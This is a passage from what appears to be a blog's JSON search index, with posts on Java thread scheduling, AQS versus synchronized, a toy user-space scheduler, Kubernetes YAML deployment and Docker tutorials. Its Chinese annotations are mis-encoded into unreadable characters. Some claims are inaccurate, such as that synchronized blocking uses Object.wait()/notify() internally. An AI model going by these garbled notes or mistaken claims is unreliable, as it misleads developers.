scheduler ultimately controls thread execution, but application code can influence behavior through Javaâ€™s threading APIs, synchronization, and resource management. For fine-grained control, low-level OS tools or real-time systems are required.\nJVM and OS Interactions The JVM acts as an intermediary between Java code and the OS. It maps Java thread operations to OS-specific primitives (e.g., POSIX threads on Unix-like systems). Some JVM implementations may optimize thread scheduling (e.g., biased locking for synchronization), but these are OS-agnostic and still subject to OS-level scheduling. è¯´ç™½äº†, jvm å†æ€æ ·ä¼˜åŒ–ç»ˆç©¶æ˜¯ userspace ä»£ç , å†…æ ¸ä¸å…³å¿ƒã€‚ Limitations of Application Control No Direct Control: Java does not expose low-level OS scheduling policies (e.g., SCHED_FIFO or SCHED_RR in Linux). Applications cannot directly set real-time scheduling policies. Platform Variability: Thread behavior may differ across OSes (e.g., Windows vs. Linux) or JVM implementations (e.g., HotSpot vs. OpenJ9). Real-Time Java (RTSJ) For applications requiring deterministic scheduling (e.g., real-time systems), the Real-Time Specification for Java (RTSJ) provides stricter control over threads, but this requires a real-time JVM and OS support. AQS å’Œ OS å…³ç³» The AbstractQueuedSynchronizer (AQS) is a foundational class in Javaâ€™s java.util.concurrent package that provides a framework for building synchronizers like locks (ReentrantLock), barriers (CyclicBarrier), latches (CountDownLatch), and semaphores (Semaphore). While the OS scheduler still governs thread execution, AQS introduces mechanisms to manage thread blocking/waking and fairness policies, which directly influence thread behavior and scheduling.\nHow AQS Works AQS manages synchronization by:\nState Management:\nUses a volatile int state to represent the synchronization state (e.g., lock count for ReentrantLock, remaining permits for Semaphore, or count for CountDownLatch). Threads attempt to modify this state atomically (via CAS operations like compareAndSetState). Wait Queue:\nMaintains a FIFO queue of waiting threads (as Node objects) when they fail to acquire the state. Threads in the queue are parked (blocked) using LockSupport.park() until signaled by another thread. Blocking and Waking:\nWhen a thread cannot acquire the state (e.g., a lock is held), AQS parks it (via LockSupport.park()), which transitions it to the WAITING or TIMED_WAITING state. When the state is released (e.g., a lock is unlocked), AQS unparks waiting threads (via LockSupport.unpark()) to retry acquiring the state. AQS å¯¹ Thread Scheduling çš„å½±å“ AQS indirectly affects thread scheduling by:\nReducing Spurious Wakeups and Busy-Waiting:\nInstead of spinning (busy-waiting), AQS parks threads, allowing the OS scheduler to skip them until unparked. This reduces CPU usage and contention. Fairness Control:\nAQS supports both fair and unfair modes: Fair mode: Threads are granted access in FIFO order (queued). This ensures fairness but may reduce throughput due to frequent context switches. Unfair mode: Threads may â€œbypassâ€ the queue if the state is available, improving throughput but risking starvation for waiting threads. Thread Blocking/Waking Coordination:\nAQS ensures that threads are woken up only when the synchronization state changes (e.g., a lock is released). This avoids unnecessary wakeups (unlike Object.notify() in intrinsic locks). Interruptible and Timed Waits:\nAQS allows threads to respond to interrupts (InterruptedException) or timeout during waits (e.g., tryLock(long timeout, TimeUnit)), giving applications finer control over thread behavior. Comparison to Intrinsic Locks (synchronized) Feature AQS (e.g., ReentrantLock) Intrinsic Lock (synchronized) Blocking Mechanism Uses LockSupport.park() Uses Object.wait()/notify() Fairness Configurable (fair/unfair) No fairness guarantees Interruptibility Supports InterruptedException Cannot interrupt waiting threads Timed Waits Supports timeouts (e.g., tryLock) No timeout support Performance Optimized for high contention Slower under high contention AQS-based synchronizers (like ReentrantLock) are generally more efficient and flexible than intrinsic locks, especially under high contention.\nUnderlying OS Interaction Parking/Unparking:\nLockSupport.park() and unpark() are implemented using OS-specific primitives:\nOn Linux: Uses futex (fast userspace mutex). On Windows: Uses WaitOnAddress or Condition Variables. These mechanisms allow threads to sleep/wakeup efficiently, managed by the OS scheduler. Context Switching:\nWhen a thread is parked, the OS scheduler removes it from the runnable queue. When unparked, it is re-added to the queue, triggering a context switch if necessary.\nExample: ReentrantLock and AQS ReentrantLock lock = new ReentrantLock(); lock.lock(); // Acquires the lock (may block) try { // Critical section } finally { lock.unlock(); // Releases the lock, unparks waiting threads } If the lock is unavailable, lock() calls AQS.acquire(), which: Attempts to acquire the state (e.g., sets state = 1 for the first lock). Fails â†’ Adds the thread to the AQS queue. Parks the thread (OS scheduler skips it). When unlock() is called: Releases the state (e.g., sets state = 0). Unparks the next waiting thread in the queue. AQS è¦ç‚¹ç†è§£ AQS does not replace the OS scheduler but works with it to manage thread blocking/waking efficiently. Applications using AQS-based synchronizers can: Reduce contention by parking threads instead of spinning. å‡å°‘ç«äº‰, è®©çº¿ç¨‹å» sleep Control fairness and timeouts. æ§åˆ¶è·å–é”çš„å…¬å¹³æ€§å’Œè¶…æ—¶æ—¶é—´ Avoid deadlocks via interruptible waits. å¯ä¸­æ–­ç­‰å¾…é¿å…æ­»é” The OS still schedules threads when they are unparked, but AQS minimizes unnecessary scheduling overhead by managing the wait queue. è¢«å”¤é†’åä¾æ—§ç”± os è´Ÿè´£è°ƒåº¦ In essence, AQS abstracts the complexity of thread coordination, while the OS scheduler handles the actual execution of threads based on their state (runnable, parked, etc.).\nsynchronized å…³é”®å­—å’Œ OS å…³ç³» Intrinsic locks (also known as monitor locks) are Javaâ€™s built-in synchronization mechanism, implemented using the synchronized keyword. They provide mutual exclusion and visibility guarantees but are less flexible and lower-level compared to synchronizers like AbstractQueuedSynchronizer (AQS).\nHow Intrinsic Locks Work Implicit Locking:\nEvery Java object has an intrinsic lock (monitor). When a thread enters a synchronized method or block:\nIt acquires the intrinsic lock associated with the object (e.g., this for instance methods, the class object for static methods). It releases the lock automatically when exiting the method/block (even if an exception is thrown). Blocking Behavior:\nIf a thread cannot acquire the lock (e.g., itâ€™s held by another thread), it blocks until the lock becomes available. The JVM uses OS-specific mechanisms (e.g., Object.wait()/notify() internally) to manage blocked threads. Reentrancy:\nThreads can reacquire the same lock multiple times (e.g., nested synchronized calls). The lock is released only when the thread exits the outermost synchronized block/method. synchronized å¯¹ Thread Scheduling çš„å½±å“ Intrinsic locks interact with the OS scheduler similarly to AQS-based synchronizers, but with key differences:\nAspect Intrinsic Locks (synchronized) AQS-Based Locks (e.g., ReentrantLock) Blocking Mechanism Uses Object.wait()/notify() internally Uses LockSupport.park()/unpark() Fairness No fairness guarantees Configurable (fair/unfair) Interruptibility Cannot interrupt waiting threads Supports InterruptedException Timed Waits No timeout support Supports timeouts (e.g., tryLock()) Performance Optimized in modern JVMs (biased locking) More efficient under high contention Limitations of Intrinsic Locks No Fairness Control:\nThreads waiting for the lock may be chosen arbitrarily by the JVM/OS, leading to potential starvation in high-contention scenarios. No Support for Try/Lock with Timeout:\nThreads cannot attempt to acquire the lock without blocking (e.g., tryLock()), nor can they specify a timeout. No Interruption Handling:\nThreads blocked on a synchronized lock cannot be interrupted (unlike AQS-based locks). This can lead to deadlocks if a thread holding the lock hangs or fails to release it. Coarse-Grained Control:\nLimited to mutual exclusion; no support for advanced synchronization patterns (e.g., read/write locks, condition variables with signal groups). Example: Intrinsic Lock Usage public class Counter { private int count = 0; // Acquires the intrinsic lock on 'this' public synchronized void increment() { count++; } // Acquires the intrinsic lock on 'this' public synchronized int getCount() { return count; } } If one thread is executing increment(), others must wait until it exits. No way to interrupt or time out the wait. When to Use Intrinsic Locks Simple Use Cases: For low-contention scenarios where simplicity and brevity are prioritized. Legacy Code: Older Java codebases often use synchronized due to historical reasons. Performance: Modern JVMs optimize intrinsic locks heavily (e.g., biased locking, lock coarsening), making them competitive with AQS-based locks in many cases. OS Scheduler Interaction When a thread blocks on an intrinsic lock, the JVM requests the OS to park the thread (similar to AQS, but via different mechanisms like Object.wait()). The OS scheduler removes the thread from the runnable queue until the lock is released and notify() is called. Context switches occur when threads are woken up, just like with AQS. æ¶‰åŠåˆ°äº†å†…æ ¸ synchronized è¦ç‚¹ç†è§£ Intrinsic locks are simpler but less flexible than AQS-based synchronizers. AQS provides finer control over fairness, timeouts, and interruption handling, making it better suited for complex concurrency scenarios. Modern JVMs optimize intrinsic locks, so performance differences are often negligible unless dealing with high contention or requiring advanced features. For most new applications, prefer AQS-based utilities (ReentrantLock, Semaphore, etc.) unless simplicity is critical. For deeper control, use java.util.concurrent abstractions built on AQS.\nsynchronized ç”¨æˆ·ç©ºé—´ä¼˜åŒ–æ€è·¯ The core ideas behind user-space optimizations for Java intrinsic locks (synchronized) revolve around minimizing the cost of synchronization by reducing reliance on expensive OS-level operations (like system calls or context switches). These optimizations exploit patterns in real-world code and runtime adaptability to make synchronization faster in common scenarios, while still falling back to kernel-level mechanisms only when necessary.\nUser-Space Lock ä¼˜åŒ–åŸåˆ™ 1. Avoid Kernel Transitions (Fast Paths) Goal: Reduce or eliminate transitions to the OS kernel (e.g., futex waits, mutex operations) for uncontended locks. How: Use atomic instructions (e.g., Compare-and-Swap, or CAS) in user space for lock acquisition. Only escalate to OS-level blocking (e.g., park(), wait()) when contention is detected. Example: Lightweight locking avoids syscalls for uncontended locks. 2. Leverage Runtime Profiling and Adaptivity Goal: Dynamically adapt lock behavior based on observed runtime patterns. How: The JVMâ€™s Just-In-Time (JIT) compiler and runtime monitor lock usage (e.g., frequency of contention, thread ownership). Apply optimizations like biased locking or adaptive spinning based on runtime data. Example: Biased locks are revoked only when contention occurs, saving overhead in single-threaded cases. 3. Reduce Lock Granularity Overhead Goal: Minimize the number of lock operations and their critical sections. How: Merge adjacent or closely spaced synchronized blocks (lock coarsening). Eliminate locks entirely for thread-local objects (lock elision via escape analysis). Trade-off: Balance between reducing overhead and avoiding overly large critical sections that increase contention. 4. Exploit Common Concurrency Patterns Goal: Optimize for typical usage patterns in Java applications. How: Assume locks are often uncontended (e.g., lightweight locking). Assume threads may reacquire the same lock (e.g., biased locking for reentrant access). Assume waits are often short-lived (e.g., adaptive spinning before parking). ä¼˜åŒ–ç±»å‹å’Œç»†èŠ‚ 1. Lightweight Locking (Fast Path) Uncontended Locks: Acquire a lock using a single CAS operation. If successful, no OS interaction is needed. Contended Locks: If CAS fails (another thread holds the lock), escalate to OS-level blocking (e.g., futex on Linux). Why It Works: Most locks in practice are uncontended, so the fast path avoids costly syscalls. 2. Biased Locking (Deprecated in Java 15+) Core Idea: Bias a lock toward a thread to eliminate atomic operations for reentrant access. Mechanism: Mark the object header with the thread ID of the first acquirer. Subsequent acquisitions by the same thread require only a thread ID check (no CAS). Trade-off: Fast for single-threaded access but adds overhead for revocation under contention. 3. Lock Coarsening Core Idea: Merge adjacent synchronized blocks to reduce lock/unlock overhead. Example: synchronized(lock) { doA(); } synchronized(lock) { doB(); } â†’ Merged into: synchronized(lock) { doA(); doB(); } Why It Helps: Reduces the number of lock operations and avoids unnecessary context switches. 4. Lock Elision (Escape Analysis) Core Idea: Remove locks entirely if the locked object is proven to be thread-local. Mechanism: The JIT compiler analyzes object scope to determine if it escapes the current thread. If not, synchronization is removed. Example: void method() { Object localLock = new Object(); synchronized(localLock) { /* Lock elided */ } } 5. Adaptive Spinning Core Idea: Spin (busy-wait) briefly before parking a blocked thread, assuming the lock may become available soon. How: The spin count adapts dynamically based on historical contention (e.g., spin longer if the lock was recently contended). Why It Helps: Avoids the cost of parking/unparking threads for short waits. ä¸ºä»€ä¹ˆä¼˜åŒ–ä¼šæœ‰ç”¨? Most Locks Are Uncontended:\nStudies show ~90% of locks are uncontended in real-world applications. Lightweight locking and biased locking optimize this common case. é”å¤§å¤šæ•°æ—¶å€™æ²¡æœ‰ç«äº‰ Thread Reentrancy:\nApplications often reacquire the same lock (e.g., recursive method calls). Biased locking reduces overhead for reentrant access. è·å–é”å, ä¼šå†æ¬¡è·å–åŒä¸€ä¸ªé” Short Critical Sections:\nCritical sections are often small (e.g., incrementing a counter). Adaptive spinning avoids context switches for short waits. ä¸´ç•ŒåŒºå¾ˆçŸ­, æ²¡æœ‰è·å–åˆ°çš„é”çš„çº¿ç¨‹å¯ä»¥å…ˆè‡ªæ—‹ä¸€ä¼š, å¾ˆå¤§å¯èƒ½å¯ä»¥æˆåŠŸè·å–é” Thread-Local Data:\nMany objects are never shared across threads. Escape analysis eliminates synchronization overhead for such cases. å¤§å¤šæ•°å¯¹è±¡åœ¨çº¿ç¨‹é—´ä¸å…±äº« Trade-offs and Limitations Optimization Pros Cons Lightweight Locking Fast uncontended case ä¸ç«äº‰å¿«é€Ÿè·å–é” Falls back to OS for contention ç«äº‰ os å°±è¦å¹²é¢„äº† Biased Locking Zero-cost reacquisition é‡æ–°è·å–é”æ²¡æœ‰æ¶ˆè€— Revocation overhead under contention Lock Coarsening Reduces lock operations å‡å°‘è·å–é”çš„æ“ä½œ May increase critical section size ä¸´ç•ŒåŒºå˜é•¿ Lock Elision Eliminates sync overhead Limited to thread-local objects Adaptive Spinning Avoids context switches è‡ªæ—‹ä¸€ä¼š, ä¹Ÿå°±æ˜¯ busy-wait Wastes CPU cycles for long waits æµªè´¹ä¸€äº› CPU æ—¶é—´ ç»“è®º The core idea is to handle synchronization efficiently in user space whenever possible, using runtime adaptability and pattern recognition to minimize reliance on the kernel. åœ¨ç”¨æˆ·ç©ºé—´é«˜æ•ˆå¤„ç†åŒæ­¥, å°½é‡ä¸è¦æƒŠåŠ¨ OS å†…æ ¸, ä¸€æ—¦æ¶‰åŠå†…æ ¸ä»£ä»·è¾ƒé«˜ åŸºäºå“ªäº›äº‹å®åœ¨ä¼˜åŒ–? Most locks are uncontended. Threads often reacquire locks. Critical sections are small. By focusing on these patterns, modern JVMs make intrinsic locks (synchronized) competitive with AQS-based locks for many use cases, while still providing the safety and simplicity of built-in synchronization. For high-contention scenarios or advanced features (e.g., fairness, timeouts), AQS-based locks remain superior."},"title":"Java Thread"},"/blog/java-user-space-schedule/":{"data":{"driver-class#Driver class":" public class Main { public static void main(String[] args) { UserSpaceScheduler scheduler = new UserSpaceScheduler(); scheduler.addTask(new Task(\"Task A\", 3)); scheduler.addTask(new Task(\"Task B\", 5)); scheduler.addTask(new Task(\"Task C\", 2)); scheduler.run(); } } ","task-è‡ªå®šä¹‰çš„ä»»åŠ¡#Task è‡ªå®šä¹‰çš„ä»»åŠ¡":" public class Task { private String name; private int steps; public Task(String name, int steps) { this.name = name; this.steps = steps; } public boolean runStep() { if (steps \u003c= 0) return false; // Task is done System.out.println(name + \" is running. Steps left: \" + steps); steps--; return true; // Task has more work } } ","ä¸¾ä¾‹ç†è§£#ä¸¾ä¾‹ç†è§£":" A user-space scheduler manages tasks or â€œthreadsâ€ entirely within an application, without relying on the operating system (OS) scheduler. This is different from kernel-level scheduling, where the OS manages threads. ä»€ä¹ˆæ˜¯ç”¨æˆ·æ€è°ƒåº¦ï¼Ÿå¯ä»¥ç®€å•ç†è§£ä¸ºè‡ªå®šä¹‰ä¸€å †ä»»åŠ¡, ç”±ç”¨æˆ·å†³å®šæ€æ ·æ‰§è¡Œè¿™äº›ä»»åŠ¡ã€‚ä¸æ¶‰åŠæ“ä½œç³»ç»Ÿçš„è¿›ç¨‹/çº¿ç¨‹è°ƒåº¦ã€‚\nä¸¾ä¾‹ç†è§£","å¦‚ä½•å·¥ä½œ#å¦‚ä½•å·¥ä½œ":"Cooperative Multitasking Tasks are not OS threads. They are objects managed in a queue. ä¸æ˜¯ OS çš„çº¿ç¨‹\nExplicit Yielding The scheduler runs each task for one â€œstep,â€ then moves to the next. Tasks donâ€™t blockâ€”they voluntarily give up control.\nNo OS Involvement The OS sees only the main thread running scheduler.run().","è‡ªå®šä¹‰çš„è°ƒåº¦#è‡ªå®šä¹‰çš„è°ƒåº¦":" import java.util.LinkedList; import java.util.Queue; public class UserSpaceScheduler { // ä»¥ FIFO é¡ºåºæ‰§è¡Œ Task private Queue\u003cTask\u003e taskQueue = new LinkedList\u003c\u003e(); public void addTask(Task task) { taskQueue.add(task); } public void run() { while (!taskQueue.isEmpty()) { Task task = taskQueue.poll(); boolean hasMoreWork = task.runStep(); if (hasMoreWork) { // deciding which task runs next taskQueue.add(task); // Re-add to the queue if not done } } } } "},"title":"Java User Space Schedule"},"/blog/js-eventloop/":{"data":{"":"","references#References":" understanding-the-event-loop-callbacks-promises-and-async-await-in-javascript learning-functional-programming-with-javascript what is event loop?js-conf what is event loop demo an-introduction-to-functional-programming how-javascript-works-in-browser-and-node æµè§ˆå™¨æä¾› Web Apis "},"title":"js-eventloop"},"/blog/k8s-deploy-container-using-yaml/":{"data":{"":"kubernetes ä½œä¸ºä¸€ä¸ªäº‘ä¸Šçš„æ“ä½œç³»ç»Ÿï¼Œè¦æƒ³å……åˆ†åˆ©ç”¨ï¼Œå°±è¦äº†è§£ kubernetes æä¾›çš„åŠŸèƒ½ã€‚å‘Šè¯‰ç³»ç»Ÿè¦æå•¥ï¼Œk8s å¸®ä½ æå®šè¿™ä¸€åˆ‡ï¼Œå½’æ ¹ç»“åº•ï¼Œä¸å¼€å‘ k8s å°±æ˜¯ä¸€ä¸ª k8s çš„ç”¨æˆ·ï¼ŒçŸ¥é“ k8s èƒ½å…·ä½“åšå•¥ï¼Œå†™å¥½ YAML å°±å¯ä»¥ã€‚","references#References":" https://www.katacoda.com/courses/kubernetes/kubectl-run-containers apiversion what is k8s deployment? ","å¦‚ä½•åœ¨-k8s-ä¸Šéƒ¨ç½²æœåŠ¡#å¦‚ä½•åœ¨ k8s ä¸Šéƒ¨ç½²æœåŠ¡":"create Deployment One of the most common Kubernetes object is the deployment object. The deployment object defines the container spec required, along with the name and labels used by other parts of Kubernetes to discover and connect to the application.\nå‡†å¤‡ deployment.yaml The definition defines how to launch an application called webapp1 using the Docker Image katacoda/docker-http-server that runs on Port 80.\napiVersion: apps/v1 kind: Deployment # object type metadata: name: webapp1 spec: replicas: 1 selector: matchLabels: app: webapp1 template: metadata: labels: app: webapp1 spec: containers: - name: webapp1 image: katacoda/docker-http-server:latest ports: - containerPort: 80 éƒ¨ç½²åˆ° k8s ä¸­ kubectl create -f `deployment.yaml` æŸ¥çœ‹æ‰€æœ‰ deployment kubectl get deployment æŸ¥çœ‹æŸä¸€ä¸ª deployment kubectl describe deployment `webapp1` create Service kubernetes has powerful networking capabilities that control how applications communicate. These networking configurations can also be controlled via YAML.\nå‡†å¤‡ service.yaml The Service selects all applications with the label webapp1. As multiple replicas, or instances, are deployed, they will be automatically load balanced based on this common label. The Service makes the application available via a NodePort.\napiVersion: v1 kind: Service metadata: name: webapp1-svc labels: app: webapp1 spec: type: NodePort ports: - port: 80 nodePort: 30080 selector: app: webapp1 éƒ¨ç½²åˆ° k8s ä¸­ kubectl create -f `service.yaml` æŸ¥çœ‹æ‰€æœ‰ service kubectl get svc æŸ¥çœ‹æŸä¸€ä¸ª deployment kubectl describe svc `webapp1-svc` scale Deployment é…ç½® replicas apiVersion: apps/v1 kind: Deployment # object type metadata: name: webapp1 spec: replicas: 4 # selector: matchLabels: app: webapp1 template: metadata: labels: app: webapp1 spec: containers: - name: webapp1 image: katacoda/docker-http-server:latest ports: - containerPort: 80 "},"title":"k8s-deploy-container-using-yaml"},"/blog/katacoda-building-docker-image/":{"data":{"base-images#Base images":" All Docker images start from a base image. A base image is the same images from the Docker Registry which are used to start containers. Along with the image name, we can also include the image tag to indicate which particular version we want, by default, this is latest. These base images are used as the foundation for your additional changes to run your application. For example, in this scenario, we require NGINX to be configured and running on the system before we can deploy our static HTML files. As such we want to use NGINX as our base image. Dockerfileâ€™s are simple text files with a command on each line. To define a base image we use the instruction FROM image-name:tag\nFROM nginx:1.11-alpine ","building-containers#Building containers":" After writing your Dockerfile you need to use docker build to turn it into an image. The build command takes in a directory containing the Dockerfile, executes the steps and stores the image in your local Docker Engine. If one fails because of an error then the build stops. Using the docker build command to build the image. You can give the image a friendly name by using the -t name option.\ndocker build -t my-nginx-image:latest \u003eSending build context to Docker daemon 3.072kB Step 1/5 : FROM nginx:1.11-alpine ---\u003e bedece1f06cc Step 2/5 : COPY index.html /usr/share/nginx/html/index.html ---\u003e Using cache ---\u003e 2be98924804a Step 3/5 : EXPOSE 80 ---\u003e Using cache ---\u003e 233ea4308326 Step 4/5 : CMD [\"nginx\", \"-g\", \"daemon off;\"] ---\u003e Using cache ---\u003e 1a518260bb2b Step 5/5 : CMD [\"nginx\", \"-g\", \"daemon off;\"] ---\u003e Using cache ---\u003e 563c68c52ed7 Successfully built 563c68c52ed7 Successfully tagged my-nginx-image:latest ","default-commands#Default commands":" With the Docker image configured and having defined which ports we want accessible, we now need to define the command that launches the application. The CMD line in a Dockerfile defines the default command to run when a container is launched. If the command requires arguments then itâ€™s recommended to use an array, for example [â€œcmdâ€, â€œ-aâ€, â€œarga valueâ€, â€œ-bâ€, â€œargb-valueâ€], which will be combined together and the command *cmd -a â€œarga valueâ€ -b argb-value would be run. An alternative approach to CMD is ENTRYPOINT. While a CMD can be overridden when the container starts, a ENTRYPOINT defines a command which can have arguments passed to it when the container launches.\nFROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html/index.html # web server to be accessible via port 80 EXPOSE 80 # The command to run NGINX is nginx -g daemon off; CMD [\"nginx\", \"-g\", \"daemon off;\"] ","exposing-ports#Exposing ports":" With our files copied into our image and any dependencies downloaded, you need to define which port application needs to be accessible on. Using the EXPOSE port command you tell Docker which ports should be open and can be bound too. You can define multiple ports on the single command, for example, EXPOSE 80 433 or EXPOSE 7000-8000\nFROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html/index.html # web server to be accessible via port 80 EXPOSE 80 ","launching-new-image#Launching new image":" NGINX is designed to run as a background service so you should include the option -d. To make the web server accessible, bind it to port 80 using p 80:80\ndocker run -d -p 80:80 my-nginx-image:latest access the launched web server via the hostname docker. the command curl -i http://docker will return our index file via NGINX and the image we built.\ncurl -i http://docker ","running-commands#Running commands":" With the base image defined, we need to run various commands to configure our image. There are many commands to help with this, the main commands two are COPY and RUN. RUN command allows you to execute any command as you would at a command prompt, for example installing different application packages or running a build command. The results of the RUN are persisted to the image so itâ€™s important not to leave any unnecessary or temporary files on the disk as these will be included in the image. COPY src dest allows you to copy files from the directory containing the Dockerfile to the containerâ€™s image. This is extremely useful for source code and assets that you want to be deployed inside your container *A new index.html file has been created for you which we want to serve from our container. On the next line after the FROM command, use the COPY command to copy index.html into a directory called **/usr/share/nginx/*html\nFROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html/index.html ","steps#steps":" Docker images are built based on a Dockerfile. A Dockerfile defines all the steps required to create a Docker image with your application configured and ready to be run as a container. The image itself contains everything, from operating system to dependencies and configuration required to run your application. Having everything within the image allows you to migrate images between different environments and be confident that if it works in one environment, then it will work in another. The Dockerfile allows for images to be composable, enabling users to extend existing images instead of building from scratch. By building on an existing image, you only need to define the steps to setup your application. The base images can be basic operating system installations or configured systems which simply need some additional customisations.\nsteps"},"title":"building-docker-image"},"/blog/katacoda-deploy-static-website/":{"data":{"build-docker-image#Build docker image":" The Dockerfile is used by the Docker CLI build command. The build command executes each instruction within the Dockerfile. The result is a built Docker Image that can be launched and run your configured app. The build command takes in some different parameters. The format is docker build -t build-directory. The -t parameter allows you to specify a friendly name for the image and a tag, commonly used as a version number. This allows you to track built images and be confident about which version is being started.\n# Build our static HTML image using the build command below. # The built image will have the name webserver-image with a tag of v1. docker build -t webserver-image:v1 . # view a list of all the images on the host docker images ","create-a-dockerfile#Create a Dockerfile":"Create a Dockerfile Docker Images start from a base image. The base image should include the platform dependencies required by your application, for example, having the JVM or CLR installed. This base image is defined as an instruction in the Dockerfile. Docker Images are built based on the contents of a Dockerfile. The Dockerfile is a list of instructions describing how to deploy your application.\n# base image FROM nginx:alpine # copies the content of the current directory into a particular location (/usr/share/nginx/html)inside the container. COPY . /usr/share/nginx/html ","dockerfile-and-indexhtml#dockerfile and index.html":" # index.html \u003ch1\u003eHello World\u003c/h1\u003e ","run#Run":" The built Image can be launched in a consistent way to other Docker Images. When a container launches, itâ€™s sandboxed from other processes and networks on the host. When starting a container you need to give it permission and access to what it requires. For example, to open and bind to a network port on the host you need to provide the parameter -p host-port:container-port.\n# Launch our newly built image providing the friendly name and tag. As it's a web server, bind port 80 to our host using the -p parameter. docker run -d -p 80:80 webserver-image:v1 # Access the results of port 80 curl docker "},"title":"deploy-static-website"},"/blog/katacoda-deploying-first-docker-container/":{"data":{"access-redis#Access redis":"note: each docker container is sandboxed\nsolution1: specify host port is 6379 -p host-port:container-post\ndocker run -d --name redisHostPort -p 6379:6379 redis:latest solution2: specify randomly host port -p container-port\ndocker run -d --name redisDynamic -p 6379 redis:latest docker port redisDynamic 6379 ","find-running-container#Find running container":" docker ps docker inspect \u003ccontainer-id\u003e docker logs \u003ccontainer-id\u003e ","persisting-data#Persisting data":"-v host-dir:container-dir\ndocker run -d --name redisMapped -v /opt/docker/data/redis:/data redis ","running-a-container-backgrounddetached#Running a container background(detached)":"Running a container background(detached)docker search image-name\ndocker search redis docker run options image-name:version solution1: default latest version\ndocker run -d redis solution2: version is 3.2\ndocker run -d redis:3.2 ","running-a-container-foreground#Running a container foreground":" docker run -it ubuntu bash "},"title":"katacoda-deploying-first-docker-container"},"/blog/katacoda-what-is-a-container-image/":{"data":{"":"","container-image#container image":" A container image is a tar file containing tar files. Each of the tar file is a layer. Once all tar files have been extract into the same location then you have the containerâ€™s filesystem. container image æ˜¯ä¸€ä¸ª tar æ–‡ä»¶. æ¯ä¸€ä¸ª tar æ–‡ä»¶å°±æ˜¯ä¸€ä¸ª layer\ndocker pull æ‹‰å–ä¸€ä¸ªé•œåƒ docker pull redis:3.2.11-alpine 3.2.11-alpine: Pulling from library/redis ff3a5c916c92: Pull complete aae70a2e6027: Pull complete 87c655da471c: Pull complete bc3141806bdc: Pull complete 53616fb426d9: Pull complete 9791c5883c6a: Pull complete Digest: sha256:ebf1948b84dcaaa0f8a2849cce6f2548edb8862e2829e3e7d9e4cd5a324fb3b7 Status: Downloaded newer image for redis:3.2.11-alpine\nå¯ä»¥çœ‹åˆ° redis:3.2.11-alpine è¿™ä¸ª image æ‹‰å–äº† ff3a5c916c92, aae70a2e6027, 87c655da471c, bc3141806bdc, 53616fb426d9, 9791c5883c6a å…± 6 æ¬¡.\ndocker save éªŒè¯ image åˆ†å±‚ docker save --help Usage: docker save [OPTIONS] IMAGE [IMAGE...] Save one or more images to a tar archive (streamed to STDOUT by default) Options: -o, --output string Write to a file, instead of STDOUT éªŒè¯ redis:3.2.11-alpine åˆ†å±‚ docker save ä¿å­˜ image ä¸º tar æ–‡ä»¶ docker save redis:3.2.11-alpine \u003e redis.tar è§£å‹ tar æ–‡ä»¶ tar -xvf redis.tar tree . â”œâ”€â”€ 46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557 â”‚ â”œâ”€â”€ json // è¿™ä¸€ layer çš„é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ layer.tar â”‚ â””â”€â”€ VERSION â”œâ”€â”€ 498654318d0999ce36c7b90901ed8bd8cb63d86837cb101ea1ec9bb092f44e59 â”‚ â”œâ”€â”€ json // è¿™ä¸€ layer çš„é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ layer.tar â”‚ â””â”€â”€ VERSION â”œâ”€â”€ ad01e7adb4e23f63a0a1a1d258c165d852768fb2e4cc2d9d5e71698e9672093c â”‚ â”œâ”€â”€ json // è¿™ä¸€ layer çš„é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ layer.tar â”‚ â””â”€â”€ VERSION â”œâ”€â”€ ca0b6709748d024a67c502558ea88dc8a1f8a858d380f5ddafa1504126a3b018.json // è¿™ä¸ª `image` çš„é…ç½®æ–‡ä»¶ â”œâ”€â”€ da2a73e79c2ccb87834d7ce3e43d274a750177fe6527ea3f8492d08d3bb0123c â”‚ â”œâ”€â”€ json // è¿™ä¸€ layer çš„é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ layer.tar â”‚ â””â”€â”€ VERSION â”œâ”€â”€ db1a23fc1daa8135a1c6c695f7b416a0ac0eb1d8ca873928385a3edaba6ac9a3 â”‚ â”œâ”€â”€ json // è¿™ä¸€ layer çš„é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ layer.tar â”‚ â””â”€â”€ VERSION â”œâ”€â”€ f07352aa34c241692cae1ce60ade187857d0bffa3a31390867038d46b1e7739c â”‚ â”œâ”€â”€ json // è¿™ä¸€ layer çš„é…ç½®æ–‡ä»¶ â”‚ â”œâ”€â”€ layer.tar â”‚ â””â”€â”€ VERSION â”œâ”€â”€ manifest.json â”œâ”€â”€ redis.tar // docker save çš„ tar æ–‡ä»¶ â””â”€â”€ repositories æŸ¥çœ‹è§£å‹åçš„ tar æ–‡ä»¶ ls 46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557 498654318d0999ce36c7b90901ed8bd8cb63d86837cb101ea1ec9bb092f44e59 ad01e7adb4e23f63a0a1a1d258c165d852768fb2e4cc2d9d5e71698e9672093c ca0b6709748d024a67c502558ea88dc8a1f8a858d380f5ddafa1504126a3b018.json da2a73e79c2ccb87834d7ce3e43d274a750177fe6527ea3f8492d08d3bb0123c db1a23fc1daa8135a1c6c695f7b416a0ac0eb1d8ca873928385a3edaba6ac9a3 f07352aa34c241692cae1ce60ade187857d0bffa3a31390867038d46b1e7739c manifest.json repositories\næŸ¥çœ‹ manifest.json [ { \"Config\":\"ca0b6709748d024a67c502558ea88dc8a1f8a858d380f5ddafa1504126a3b018.json\", // æ•´ä¸ª image çš„é…ç½®æ–‡ä»¶ \"RepoTags\":[ \"redis:3.2.11-alpine\" // image çš„ tag ], \"Layers\":[ \"498654318d0999ce36c7b90901ed8bd8cb63d86837cb101ea1ec9bb092f44e59/layer.tar\", // 1 \"ad01e7adb4e23f63a0a1a1d258c165d852768fb2e4cc2d9d5e71698e9672093c/layer.tar\", // 2 \"da2a73e79c2ccb87834d7ce3e43d274a750177fe6527ea3f8492d08d3bb0123c/layer.tar\", // 3 \"db1a23fc1daa8135a1c6c695f7b416a0ac0eb1d8ca873928385a3edaba6ac9a3/layer.tar\", // 4 